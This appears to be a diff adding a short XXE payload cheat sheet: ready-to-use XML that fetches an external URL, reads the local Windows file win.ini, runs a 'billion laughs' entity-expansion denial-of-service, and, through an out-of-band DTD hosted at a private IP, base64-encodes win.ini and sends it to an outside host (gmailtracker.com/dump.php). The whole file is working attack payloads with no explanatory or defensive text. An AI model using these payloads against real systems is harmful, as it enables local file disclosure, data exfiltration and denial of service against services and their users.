@@ -1,0 +1,29 @@
+** read from external file
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY xxe SYSTEM "https://pastebin.com/raw/GRgX2e4i" >]>
+<creds><user>&xxe;</user><pass>A123456a</pass></creds>
+
+** read local file
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+<creds><user>&xxe;</user><pass>A123456a</pass></creds>
+
+** billion laughs attack
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r [<!ELEMENT r ANY >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+
+** blind XSS by using dtd
+dtd:
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://gmailtracker.com/dump.php?p=%file;'>">%all;
+
+payload:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r SYSTEM "http://192.168.1.123/RCE/test.dtd">
+<creds><user>&send;</user><pass>A123456a</pass></creds>
